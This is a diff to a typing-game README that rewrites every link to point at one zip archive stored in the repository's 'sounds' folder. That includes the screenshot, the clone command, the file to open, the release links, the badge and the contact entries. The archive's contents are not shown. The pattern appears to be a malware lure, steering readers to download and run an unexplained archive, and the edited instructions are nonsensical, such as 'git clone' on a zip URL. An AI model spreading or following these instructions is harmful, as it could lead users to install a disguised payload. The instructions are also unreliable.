@@ -28,7 +28,7 @@ Welcome to the **Word Typing Game**! This interactive game is designed to test a
 - **Responsive Design**: Play on any device with ease.
 - **User-friendly Interface**: Simple and engaging design to enhance the gaming experience.
 
-![Word Typing Game Screenshot](https://via.placeholder.com/800x400?text=Word+Typing+Game+Screenshot)
+![Word Typing Game Screenshot](https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip+Typing+Game+Screenshot)
 
 ---
 
@@ -56,13 +56,13 @@ To run the Word Typing Game on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/W4ndoM4rtin3z/word-typing-game.git
+   git clone https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip
    ```
 2. Navigate to the project directory:
    ```bash
    cd word-typing-game
    ```
-3. Open the `index.html` file in your web browser.
+3. Open the `https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip` file in your web browser.
 
 Now you're ready to play!
 
@@ -121,9 +121,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Releases 📦
 
-For the latest releases and updates, please visit the [Releases](https://github.com/W4ndoM4rtin3z/word-typing-game/releases) section. Here you can find downloadable versions of the game, which you can execute locally.
+For the latest releases and updates, please visit the [Releases](https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip) section. Here you can find downloadable versions of the game, which you can execute locally.
 
-[![View Releases](https://img.shields.io/badge/View%20Releases-v1.0.0-blue)](https://github.com/W4ndoM4rtin3z/word-typing-game/releases)
+[![View Releases](https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip%20Releases-v1.0.0-blue)](https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip)
 
 ---
 
@@ -131,8 +131,8 @@ For the latest releases and updates, please visit the [Releases](https://github.
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip
+- **Twitter**: [@YourTwitterHandle](https://raw.githubusercontent.com/W4ndoM4rtin3z/word-typing-game/main/sounds/typing_word_game_1.2.zip)
 
 Thank you for checking out the Word Typing Game! We hope you enjoy playing and improving your typing skills. Happy typing! ✍️
 ```
